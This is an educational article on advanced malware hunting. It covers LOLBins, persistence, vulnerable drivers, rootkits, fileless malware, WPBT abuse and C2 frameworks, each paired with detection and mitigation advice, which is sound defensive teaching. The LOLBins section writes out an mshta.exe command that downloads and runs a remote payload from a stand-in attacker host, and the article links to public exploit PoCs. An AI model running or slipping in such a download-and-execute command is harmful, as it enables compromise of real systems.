# Malware Hunting - Advanced
___
Author(s): a_person

Last Updated: 07-2-2025

<details>
<summary>Recommended Prerequisites (click to expand)</summary>
<p>Malware Hunting - Beginner</p>

</details>

## Note

This article is structured like so:
1. What is it?
2. Why is it hard to detect?
3. Example
4. Mitigation/Detection

## LOLBinaries

LOL in this case stands for "Living Off the Land." These are pre-existing legitimate tools/binaries, typically trusted and signed, that are abused to do malicious activity. The reason for doing this is to blend in with normal system activity, which can reduce the likely hood of being detected.

The main reason why it is hard to detect these, as stated above, is because of the leveraging of normal tools.

An example of malware using LOLBins is the use of regsvr32.exe to execute a malicious script/payload without dropping an actual executable file to disk. This technique is often used in fileless malware attacks.
```cmd
mshta.exe "http://attacker.com/skibidipayload.hta"
```
In this example:
- mshta.exe is a legit Windows binary used to run .hta files.
- http://attacker.com/skibidipayload.hta is a malicious payload
- mshta.exe will then download the file and execute it from memory

Modern Endpoint Detection and Response(EDRs) and Antiviruses(AVs) can detect this, thankfully. They typically use behavioral analysis along with Security Information and Event Management and User and Entity Behavior Analytics. AppLocker and Windows Defender Application Control can be used by Windows Defender to restrict LOLBins.

## Source Code Files

Yes, you read that right. Source code files are often used because they can easily be obfuscated and are not detected by AVs.

They are difficult to detect because on their own they are interpreted rather than compiled. Also, Antiviruses that use dynamic analysis may set up environments without Python installed, or it's dependencies. This makes Antiviruses start to rely more on hashes, which can be easily changed by adding/deleting comments or obfuscating the code.

Here are some examples of CVE PoCs written in Python:

- [CVE-2019-0708 exploit.py](https://github.com/RICSecLab/CVE-2019-0708/blob/master/exploit.py) — [VirusTotal](https://virustotal.com/file/0a8ca1b3137c46b2c762a65ca334bec5efe41f7a7edb5a85e23b60ff412ae1e1)
  
- [CVE-2014-6271 shellshock.py](https://github.com/b4keSn4ke/CVE-2014-6271/blob/main/shellshock.py) — [VirusTotal](https://virustotal.com/file/f34dd84fb0c0188d7035896422078aeab8edb3f6840d2c447c88335b9dee8aa7)

The main solution to this is just to simply use [Everything](https://www.voidtools.com/) and search for source code extensions (.py, .cs, etc). Additionally, if the applications needed to run these applications are not needed, uninstall them.

## Persistence Mechanisms

Persistence, are well, persistent. They are mainly for an attacker/red teamer to maintain access to a machine. This is usually done by making a script/binary execute on startup or when an event happens.

Some persistence mechanisms are very easy to detect because the follow the Mittre Att&ck frame work and show up in Autoruns. However, Autoruns is not able to detect some new persistence methods as it gets outdated some times. Also, in very rare instances, not all persistence mechanisms are covered in the MITRE ATT&CK framework, meaning some custom persistence methods might not be visible through either MITRE ATT&CK mappings or traditional detection tools. Also, the amount of false positives coming out of Autoruns is significantly increasing, for example, the discord updater is incorrectly marked.

An example of Autoruns caught lacking is the [Phantom Persistence](https://blog.phantomsec.tools/phantom-persistence) which is currently undetected when this was written (07/01/25). This was however mapped to the MITRE Framework a couple months before.

The best way to deal with this is through monitoring Event logs. PersistenceSniper may also occasionally detect persistences that Autoruns does not. Sysmon may help in finding these, as it can find key Event IDs.


## Vulnerable Drivers

Vulnerable drivers represent a significant threat as they operate with high privileges (kernel), allowing attackers to gain complete control of a system. A common technique is the "Bring Your Own Vulnerable Driver" (BYOVD) attack, where a legitimate, signed, but vulnerable driver is installed to bypass security controls and load malicious code. For example, malware has been observed exploiting a legitimate Avast anti-rootkit driver to disable security software.

These drivers are hard to find because they are often signed by trusted vendors, allowing them to appear authentic. Attackers can also use many variants of the same vulnerable driver to evade signature-based detection. This is also because of the slow rollouts of block lists. VT also shows that not many vendors/no venders detect vulnerable drivers.

Examples of this include RTCore64.sys and wsftprm.sys. These drivers are both vulnerable, both have CVEs, and are both not detected as much as they should be. 
- https://www.virustotal.com/gui/file/01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd
- https://www.virustotal.com/gui/file/ff5dbdcf6d7ae5d97b6f3ef412df0b977ba4a844c45b30ca78c0eeb2653d69a8

There are some tools that use the loldrivers data base, such as https://github.com/isiddique2024/Vulnerable-Driver-Scanner, and you can ultimately make your own. The ``driverquery`` command shows a list of drivers and can be compared with vulnerable drivers. Again, Sysmon can also detect driver loaded events. Autoruns is also able to detect drivers, but it does not highlight vulnerable signed drivers, because they are signed. Therefore, it is important to create a baseline on a hardened vanilla machine before using Autoruns.

## Rootkits

Rootkits are a type of malware designed to conceal their presence. They are typically used to escalate privileges, hide files and processes, remotely execute files, act as backdoors, and monitor user activity. There are two types of rootkits: user-mode and kernel-mode. User-mode rootkits are easier to detect because they operate only at the application layer. Kernel-mode rootkits operate at the kernel level, which makes them much harder to detect.

As stated above, rootkits are difficult to detect, especially kernel-mode rootkits. Because these rootkits have the highest privileges, they can easily bypass or disable security software. They can also intercept API calls and modify them to hide their presence. In some cases, rootkits may even disable system logging or tamper with forensic tools to avoid detection.

A recent example of this is the Demodex rootkit, which you can read more about here: https://www.sygnia.co/blog/ghost-emperor-demodex-rootkit/

Detecting rootkits is difficult without proper tooling. Scanners like GMER, Malwarebytes' Anti-Rootkit scanner, Avast's Rootkit Scanner and Removal Tool, and Rootkit Revealer(although a bit outdated), are designed to look for the discrepancies and hidden artifacts that rootkits create. 

## Fileless Malware

Fileless malware is a type of attack that operates in a computer's memory, without writing any executable files to the disk. This approach allows it to evade file-based detection. These attacks often leverage legitimate and trusted system tools(LOLbins), such as PowerShell or Windows Management Instrumentation to execute malicious code directly in memory.

Fileless malware is hard to find, especially after a restart. It also uses LOLBins, which as stated before, blend in with normal system activity, making malicious actions appear routine. Traditional antivirus solutions primarily focus on scanning files stored on disk, which means fileless attacks can easily evade detection.

An example of this is the Emotet Malware. Emotet has been known to use WMI to execute PowerShell commands and launch powershell.exe without dropping files onto the disk, allowing it to evade many security tools. The Emotet also abused several other tactics. You can read more here https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a .

Application control can be used to prevent the misuse of lolbins by enforcing constraints on their capabilities. A Host-Based Intrusion Prevention System (HIPS) can block suspicious in-memory activities. EDR solutions are also helpful in both detection and response, allowing analysts to terminate malicious processes and clean up changes made in memory or the registry.

## WPBT Abuse

The Windows Platform Binary Table (WPBT) is a feature introduced way back in Windows 8 that lets manufacturers run a program every time the system starts. Although it is intended for legitimate purposes, security researchers found that weaknesses in how it works could be exploited by attackers to install persistent malware similar to rootkits.

WPBT-based threats are difficult to detect because they function at the motherboard firmware level, beneath the operating system and most security tools. This persistence method continues to work even after a complete operating system reinstallation, disk formatting, or hard drive replacement. Since this feature is a legitimate part of the ACPI specification, its usage does not inherently seem malicious. This allows an attacker’s software to be loaded by a trusted system process.

An example of this is Eclypsium's [WPBT Exploit Demonstration](https://eclypsium.com/research/everyone-gets-a-rootkit/), where it is demonstrated how attackers could exploit WPBT to install a rootkit on Windows systems.

Security professionals need to check the system's firmware for a WPBT entry by looking at the ACPI tables. There are tools that help determine if WPBT injection is possible on a system. One way to identify suspicious activity is by watching for unexpected files like ``wpbbin.exe`` in ``C:\Windows\System32`` or unusual services starting early in the boot process. The best way to prevent WPBT abuse is to turn it off completely by setting a specific registry key, ``HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DisableWpbtExecution``, to 1 or using something like https://github.com/Jamesits/dropWPBT. It's also crucial to keep the motherboard firmware updated, as manufacturers often release patches to fix related vulnerabilities.


## Post-Exploitation Frameworks and C2s

Post-exploitation frameworks are toolkits used by attackers after they have gained initial access to a system. These frameworks usually provide a Command and Control (C2 or C&C) server that allows an attacker to manage implants on compromised machines, enabling actions such as lateral movement, privilege escalation, and data exfiltration. Well-known examples include Cobalt Strike, Sliver, and Metasploit.

These frameworks are hard to detect because they aim to bypass security measures. Typically, post-exploitation frameworks privilage escilate. With this, the attacker can disable or blind security tools like antivirus and EDR solutions, as well as have rootkit like capabilities. Alos, they sometimes are fileless, using LOLBins or running things in memory, which poses the same issue as before. The framework's implants, or "beacons," often run completely in memory to avoid file-based scanners. Meanwhile, highly customizable C2 profiles enable their network traffic to imitate legitimate services, allowing them to blend in with regular network activity.

A very well known example is an attacker using Cobalt Strike's beacon, which injects into LOLBins. The beacon then communicates with the C2 server using a Malleable C2 profile configured to look like normal web traffic, requesting commands and sending back data at regular, "jittered" intervals to avoid detection by network monitoring tools.

Detecting these frameworks requires multiple security measures. Network traffic analysis can identify beaconing behavior through patterns in connection frequency, data size, and domain reputation, even when the traffic is encrypted. Advanced EDR solutions are important for detecting behavioral indicators of a C2, such as suspicious process injection, parent-child process anomalies, and in-memory execution. Proactive threat hunting using YARA rules(a pattern-matching engine) to scan memory and processes for known C2 framework artifacts can also detect hidden implants.


### References, Further Reading, & Tools Mentioned

- https://socprime.com/blog/what-are-lolbins/
- https://lolbas-project.github.io/
- https://blog.phantomsec.tools/phantom-persistence
- https://persistence-info.github.io/
- https://attack.mitre.org/
- https://github.com/last-byte/PersistenceSniper
- https://www.loldrivers.io/
- https://en.wikipedia.org/wiki/Rootkit
- https://www.sygnia.co/blog/ghost-emperor-demodex-rootkit/
- https://www.crowdstrike.com/en-us/cybersecurity-101/malware/fileless-malware/
- https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a
- https://www.bleepingcomputer.com/news/security/microsoft-wpbt-flaw-lets-hackers-install-rootkits-on-windows-devices/
- https://github.com/InQuest/awesome-yara
- https://docs.rapid7.com/metasploit/about-post-exploitation/
- https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit?gid=0
- https://www.cobaltstrike.com/
- https://www.metasploit.com/
- https://github.com/Jamesits/dropWPBT
- https://eclypsium.com/research/everyone-gets-a-rootkit/
- http://www.gmer.net/
- https://www.malwarebytes.com/solutions/rootkit-scanner
- https://www.avast.com/c-rootkit-scanner-tool
- https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
- https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- https://learn.microsoft.com/en-us/sysinternals/downloads/rootkit-revealer
- https://www.voidtools.com/

